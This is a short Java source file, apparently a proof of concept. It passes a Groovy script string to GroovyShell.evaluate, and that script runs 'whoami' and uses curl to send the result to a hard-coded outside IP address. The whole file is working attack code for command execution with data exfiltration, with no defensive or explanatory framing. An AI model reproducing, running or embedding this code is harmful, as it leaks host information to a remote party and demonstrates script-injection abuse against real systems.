import groovy.lang.GroovyShell;
import org.codehaus.groovy.control.CompilationFailedException;

import java.io.IOException;

public class Gro {
    public static void main(String[] args) {
        try {
            testGroovy1();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void testGroovy1() throws CompilationFailedException, IOException {
        GroovyShell groovyShell = new GroovyShell();
        String txe = "def a = 'whoami'.execute().text;def b = 'curl 18.162.60.133:443/'+a;b.execute()";
        System.out.println(txe);
        groovyShell.evaluate(txe);
    }
}
